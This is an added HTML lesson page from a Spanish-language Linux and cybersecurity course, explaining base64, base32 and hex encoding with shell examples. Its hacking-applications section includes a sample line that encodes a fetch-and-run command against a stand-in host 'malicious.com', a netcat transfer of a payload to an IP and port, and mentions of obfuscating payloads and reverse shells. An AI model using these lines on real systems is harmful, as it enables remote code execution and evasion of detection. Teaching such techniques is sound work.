@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>38. Codificación y decodificación en base64 | Introducción a Linux</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="../../css/styles.css" />
+    <style>
+      .lesson-content {
+        max-width: 800px;
+        margin: 2rem auto;
+        padding: 0 2rem 4rem;
+      }
+      .lesson-content h2 {
+        font-size: 1.5rem;
+        margin: 2rem 0 1rem;
+        color: var(--accent);
+      }
+      .lesson-content h3 {
+        font-size: 1.1rem;
+        margin: 1.5rem 0 0.5rem;
+        color: var(--text-1);
+      }
+      .lesson-content p {
+        color: var(--text-2);
+        margin-bottom: 1rem;
+        line-height: 1.8;
+      }
+      .lesson-content ul, .lesson-content ol {
+        color: var(--text-2);
+        margin-bottom: 1rem;
+        padding-left: 1.5rem;
+      }
+      .lesson-content li { margin-bottom: 0.4rem; }
+      .lesson-content .highlight {
+        background: var(--bg-card);
+        border-left: 3px solid var(--accent);
+        padding: 1rem 1.2rem;
+        border-radius: 0 8px 8px 0;
+        margin: 1rem 0;
+        font-size: 0.9rem;
+      }
+      .lesson-content .warning {
+        background: var(--bg-card);
+        border-left: 3px solid var(--red);
+        padding: 1rem 1.2rem;
+        border-radius: 0 8px 8px 0;
+        margin: 1rem 0;
+        font-size: 0.9rem;
+      }
+      .lesson-content code {
+        font-family: var(--mono);
+        background: var(--bg-hover);
+        padding: 0.1rem 0.4rem;
+        border-radius: 3px;
+        font-size: 0.85rem;
+        color: var(--accent);
+      }
+      .lesson-content pre {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem 1.2rem;
+        margin: 1rem 0;
+        overflow-x: auto;
+      }
+      .lesson-content pre code {
+        background: none;
+        padding: 0;
+        color: var(--text-1);
+      }
+      .lesson-content .step {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem 1.2rem;
+        margin: 0.8rem 0;
+      }
+      .lesson-content .step-num {
+        display: inline-block;
+        background: var(--accent);
+        color: #0a0c10;
+        font-weight: 700;
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 4px;
+        margin-right: 0.5rem;
+        font-family: var(--mono);
+      }
+      .lesson-content table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 1rem 0;
+        font-size: 0.85rem;
+      }
+      .lesson-content th, .lesson-content td {
+        border: 1px solid var(--border);
+        padding: 0.6rem 0.8rem;
+        text-align: left;
+      }
+      .lesson-content th {
+        background: var(--bg-card);
+        color: var(--text-1);
+        font-weight: 600;
+      }
+      .lesson-content td { color: var(--text-2); }
+      .lesson-nav {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 3rem;
+        padding-top: 1.5rem;
+        border-top: 1px solid var(--border);
+      }
+      .lesson-nav a {
+        color: var(--accent);
+        text-decoration: none;
+        font-size: 0.9rem;
+        font-weight: 500;
+      }
+      .lesson-nav a:hover { text-decoration: underline; }
+      .back-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.4rem;
+        color: var(--text-3);
+        text-decoration: none;
+        font-size: 0.85rem;
+        margin-bottom: 1rem;
+      }
+      .back-link:hover { color: var(--accent); }
+    </style>
+  </head>
+  <body>
+    <nav>
+      <a href="../../introduccion-a-linux.html" class="nav-logo">hack<span>4u</span></a>
+      <ul class="nav-links">
+        <li><a href="../../introduccion-a-linux.html">Cursos</a></li>
+        <li><a href="#">Roadmap</a></li>
+        <li><a href="#">Conócenos</a></li>
+      </ul>
+      <div class="nav-cta">
+        <button class="btn-ghost">Iniciar sesión</button>
+        <button class="btn-accent">Registrarse</button>
+      </div>
+    </nav>
+    <div style="background: var(--bg-deep); border-bottom: 1px solid var(--border);">
+      <div class="breadcrumb">
+        <a href="../../introduccion-a-linux.html">Inicio</a><span>›</span>
+        <a href="../../introduccion-a-linux.html">Cursos</a><span>›</span>
+        <a href="../../introduccion-a-linux.html">Introducción a Linux</a><span>›</span>
+        <span style="color: var(--text-2);">Clase 38</span>
+      </div>
+    </div>
+    <div class="lesson-content">
+      <a href="../../introduccion-a-linux.html" class="back-link">← Volver al curso</a>
+      <span class="course-tag">🐧 Linux · Ciberseguridad</span>
+      <h1 class="course-title" style="margin-bottom: 0.5rem;">Codificación y decodificación en base64</h1>
+      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">Duración: 3:42 · Sección 2: Temario</div>
+
+      <p>Base64 es un sistema de codificación que convierte datos binarios en texto ASCII usando 64 caracteres (A-Z, a-z, 0-9, +, /). Es ubicuo en la web moderna: emails (MIME), autenticación HTTP, JWT, y ofuscación en malware.</p>
+
+      <h2>Codificar y decodificar con base64</h2>
+      <p>En Linux, el comando <code>base64</code> hace ambas operaciones de forma directa.</p>
+
+      <pre><code># Codificar un texto
+echo "Hack4u" | base64
+# Salida: SGFjazR1Cg==
+
+# Decodificar
+echo "SGFjazR1Cg==" | base64 -d
+
+# Codificar un archivo
+base64 imagen.png > imagen.b64
+
+# Decodificar a archivo
+base64 -d imagen.b64 > imagen_recuperada.png</code></pre>
+
+      <div class="highlight">
+        <strong>🧠 ¿Por qué "base64"?</strong> Porque usa 2⁶ = 64 caracteres. Cada carácter representa 6 bits. Para codificar 3 bytes (24 bits) se necesitan 4 caracteres base64 (4 × 6 = 24 bits). Si los datos no son múltiplo de 3, se añade padding con <code>=</code>.
+      </div>
+
+      <h2>Comparativa: base64 vs base32 vs hex</h2>
+      <table>
+        <tr>
+          <th>Codificación</th>
+          <th>Alfabeto</th>
+          <th>Eficiencia</th>
+          <th>Uso típico</th>
+        </tr>
+        <tr>
+          <td>base64</td>
+          <td>A-Z a-z 0-9 + /</td>
+          <td>75% (3 bytes → 4 chars)</td>
+          <td>Web, JWT, MIME</td>
+        </tr>
+        <tr>
+          <td>base32</td>
+          <td>A-Z 2-7</td>
+          <td>62.5%</td>
+          <td>Claves compartidas (OTP)</td>
+        </tr>
+        <tr>
+          <td>hex (base16)</td>
+          <td>0-9 a-f</td>
+          <td>50% (1 byte → 2 chars)</td>
+          <td>Hashing, debugging</td>
+        </tr>
+      </table>
+
+      <pre><code># Codificar en base32
+echo "Hack4u" | base32
+
+# Codificar en hex
+echo "Hack4u" | xxd -p
+
+# Decodificar hex a texto
+echo "4861636b3475" | xxd -r -p</code></pre>
+
+      <h2>Aplicaciones en hacking</h2>
+      <p>Base64 se usa frecuentemente en ciberseguridad para:</p>
+      <ul>
+        <li><strong>Ofuscación de payloads:</strong> Malware que codifica sus cadenas en base64 para evadir detección estática</li>
+        <li><strong>Transferencia de binarios:</strong> Pasar un binario por un canal que solo soporta texto (HTTP, DNS)</li>
+        <li><strong>Reverse shell:</strong> Codificar comandos para evasión</li>
+        <li><strong>JWT:</strong> Los tokens JWT usan base64 URL-safe (reemplaza +/ por -_)</li>
+      </ul>
+
+      <pre><code># Decodificar JWT manualmente (primer segmento = header)
+echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
+
+# Ofuscar un comando
+echo "curl http://malicious.com/payload.sh | bash" | base64
+
+# Transferir un binario por TCP
+base64 -w0 payload.exe | nc 192.168.1.10 4444</code></pre>
+
+      <div class="warning">
+        <strong>⚠️ Importante:</strong> base64 <strong>no es cifrado</strong>. Cualquiera puede decodificarlo instantáneamente. Es codificación, no encriptación. No lo uses para proteger datos sensibles.
+      </div>
+
+      <div class="lesson-nav">
+        <a href="clase-37.html">← Anterior: Interpretación de archivos binarios</a>
+        <a href="clase-39.html">Siguiente: Cifrado César y uso de tr →</a>
+      </div>
+    </div>
+    <footer>
+      <div class="footer-logo">hack4u</div>
+      <div class="footer-links">
+        <a href="#">Aviso Legal</a>
+        <a href="#">Política de Cookies</a>
+        <a href="#">Privacidad</a>
+        <a href="#">Términos y Condiciones</a>
+      </div>
+      <div>© 2026 hack4u.io — Todos los derechos reservados.</div>
+    </footer>
+  </body>
+</html>
